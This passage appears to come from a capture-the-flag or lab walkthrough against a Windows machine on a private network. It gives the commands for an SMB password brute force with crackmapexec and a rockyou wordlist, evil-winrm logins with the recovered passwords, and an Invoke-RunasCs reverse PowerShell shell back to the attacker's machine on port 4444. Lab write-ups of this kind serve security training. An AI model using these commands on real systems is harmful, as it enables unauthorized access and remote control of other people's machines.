- I discover a potential user, I try to brute force his password with crackmapexec through the smb service.
    
    ```bash
    crackmapexec smb 192.168.56.103 -u nica -p /usr/share/wordlists/rockyou.txt --local-auth
    ```

    ```bash
    evil-winrm -i 192.168.56.103 -u nica -p hardcore
    ```

- I discover a potential user, I try to brute force his password with crackmapexec through the smb service.

- I try to connect as `akanksha` with evil-winrm but it does not allow me to connect.
    
    ```bash
    evil-winrm -i 192.168.56.103 -u akanksha -p sweetgirl
    ```

- As it does not allow us to log in as `akanksha`, we can try to run commands as that user and create a revershell. For that we can use Runas.

- We import the module and run the revershell as `akanksha` to my machine.
    
    ```bash
    Import-module ./Invoke-RunasCs.ps1
    Invoke-RunasCs akanksha sweetgirl powershell -Remote 192.168.56.1:4444
    ```
